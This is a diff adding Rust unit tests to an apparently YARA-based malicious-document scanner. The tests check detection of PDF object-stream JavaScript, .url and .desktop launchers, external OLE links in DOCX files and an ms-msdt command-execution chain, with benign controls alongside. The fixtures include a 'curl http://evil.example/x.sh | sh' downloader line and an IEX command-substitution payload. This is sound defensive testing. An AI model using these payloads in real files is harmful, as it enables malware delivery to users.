+    }
+
+    #[test]
+    fn test_pdf_javascript_objstm_variant_matches_decoded_layer() {
+        // PoC bypass: with /JavaScript packed into a FlateDecode-compressed
+        // object stream, the decoded layer carries no %PDF anchor, so the
+        // $pdf-anchored PDF_JavaScript rule can never fire on it.
+        let decoded_layer = b"2 0 << /S /JavaScript /JS (app.alert(1)) >>\n";
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES, decoded_layer);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "PDF_JavaScript_ObjStm"),
+            "decoded ObjStm layer must trigger PDF_JavaScript_ObjStm: {names:?}"
+        );
+        assert!(
+            !names.iter().any(|name| name == "PDF_JavaScript"),
+            "anchored rule must stay silent without a %PDF header: {names:?}"
+        );
+
+        // Plain JS/HTML content mentioning /JS without a PDF dictionary
+        // marker must not trip the ObjStm variant.
+        let js_blob = b"const path = \"/JS library\"; eval(1);";
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES, js_blob);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "PDF_JavaScript_ObjStm"),
+            "non-PDF JS blob must not trigger PDF_JavaScript_ObjStm: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_url_shortcut_tolerates_blank_lines_and_spaced_equals() {
+        // PoC bypass: leading blank lines pushed [InternetShortcut] past the
+        // 64-byte anchor, and INI-tolerated `URL = http://` spacing defeated
+        // the literal "URL=http://" string.
+        let url_file = b"\r\n\r\n\r\n[InternetShortcut]\r\nURL = http://evil.example/payload.exe\r\nIconFile=\\\\attacker\\share\\icon.ico\r\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES_V2, url_file);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Evasion_URL_Shortcut"),
+            "spaced/blank-line .url variant must trigger Evasion_URL_Shortcut: {names:?}"
+        );
+
+        // Canonical formatting must keep matching (no regression).
+        let url_file = b"[InternetShortcut]\r\nURL=http://evil.example/x\r\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES_V2, url_file);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Evasion_URL_Shortcut"),
+            "canonical .url must still trigger Evasion_URL_Shortcut: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_desktop_entry_exec_rule() {
+        // PoC bypass: a Linux .desktop launcher executing a shell downloader
+        // was in no dangerous-extension list and matched no YARA rule.
+        let desktop = b"[Desktop Entry]\nType=Application\nName=Invoice\nExec=bash -c \"curl http://evil.example/x.sh | sh\"\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES_V2, desktop);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Evasion_Desktop_Entry_Exec"),
+            "weaponized .desktop launcher must trigger Evasion_Desktop_Entry_Exec: {names:?}"
+        );
+
+        // A benign launcher (plain app binary, no shell/downloader primitive)
+        // must stay quiet.
+        let desktop = b"[Desktop Entry]\nType=Application\nName=Files\nExec=nautilus %U\n";
+        let names = matching_rule_names(EVASION_TECHNIQUE_RULES_V2, desktop);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Evasion_Desktop_Entry_Exec"),
+            "benign .desktop launcher must not trigger Evasion_Desktop_Entry_Exec: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_office_external_ole_html_relationship_layer() {
+        // In a real DOCX this is the decoded word/_rels/document.xml.rels
+        // member. The ZIP header and relationship XML are never present in
+        // the same scan buffer, so a rule that requires both cannot match.
+        let external_ole = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId5"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
+    Target="https://fixture.invalid/payload.html!"
+    TargetMode="External"/>
+</Relationships>"#;
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, external_ole);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Office_External_OLE_HTML_Relationship"),
+            "decoded external OLE HTML relationship must be detected: {names:?}"
+        );
+
+        let spaced_single_quotes = br#"<Relationships>
+<Relationship Type = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject'
+Target = 'http://fixture.invalid/PAYLOAD.HTML!'
+TargetMode = 'External'/>
+</Relationships>"#;
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, spaced_single_quotes);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Office_External_OLE_HTML_Relationship"),
+            "legal XML quote/whitespace variants must be detected: {names:?}"
+        );
+
+        // A normal embedded OLE object stays inside the package and is not the
+        // remote HTML delivery mechanism this rule is meant to detect.
+        let embedded_ole = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId5"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
+    Target="../embeddings/oleObject1.bin"/>
+</Relationships>"#;
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, embedded_ole);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Office_External_OLE_HTML_Relationship"),
+            "embedded OLE relationship must remain a negative control: {names:?}"
+        );
+
+        // Relationship parts are XML and may be encoded as UTF-16LE. The
+        // extractor preserves member bytes, so the rule itself must recognize
+        // the wide representation instead of assuming UTF-8.
+        let mut utf16le = vec![0xff, 0xfe];
+        for byte in external_ole {
+            utf16le.extend_from_slice(&[*byte, 0]);
+        }
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, &utf16le);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Office_External_OLE_HTML_Relationship"),
+            "UTF-16LE external OLE relationship must be detected: {names:?}"
+        );
+    }
+
+    #[test]
+    fn test_msdt_protocol_execution_chain_and_benign_controls() {
+        // Inert byte fixture modeled on the documented Office/RTF -> HTML ->
+        // ms-msdt protocol chain. The test never launches a URI or process.
+        let protocol_chain = br#"<!doctype html><html><body><script>
+window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param
+IT_RebrowseForFile=fixture? IT_SelectProgram=NotListed
+IT_BrowseForFile=h$(IEX('Write-Output VIGILYX_FIXTURE_ONLY'))i/../../Windows/System32/mpsigstub.exe";
+</script></body></html>"#;
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, protocol_chain);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Office_MSDT_Protocol_Command_Execution"),
+            "complete ms-msdt execution chain must be detected: {names:?}"
+        );
+
+        let legitimate_diagnostic =
+            b"Run msdt /id PCWDiagnostic to open the Program Compatibility troubleshooter.";
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, legitimate_diagnostic);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Office_MSDT_Protocol_Command_Execution"),
+            "ordinary MSDT documentation must remain negative: {names:?}"
+        );
+
+        let security_note = b"CVE advisory: block the ms-msdt: URL protocol. Telemetry may show PCWDiagnostic in an msdt.exe command line.";
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, security_note);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Office_MSDT_Protocol_Command_Execution"),
+            "protocol documentation without the execution chain must remain negative: {names:?}"
+        );
+
+        let html_security_note = br#"<html><script>
+const indicators = "ms-msdt: PCWDiagnostic IT_BrowseForFile powershell";
+document.body.textContent = indicators;
+</script></html>"#;
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, html_security_note);
+        assert!(
+            !names
+                .iter()
+                .any(|name| name == "Office_MSDT_Protocol_Command_Execution"),
+            "HTML indicator documentation without command substitution must remain negative: {names:?}"
+        );
+
+        let mut utf16le = vec![0xff, 0xfe];
+        for byte in protocol_chain {
+            utf16le.extend_from_slice(&[*byte, 0]);
+        }
+        let names = matching_rule_names(MALICIOUS_DOCUMENT_RULES_V2, &utf16le);
+        assert!(
+            names
+                .iter()
+                .any(|name| name == "Office_MSDT_Protocol_Command_Execution"),
+            "UTF-16LE ms-msdt execution chain must be detected: {names:?}"
+        );
+    }
+}
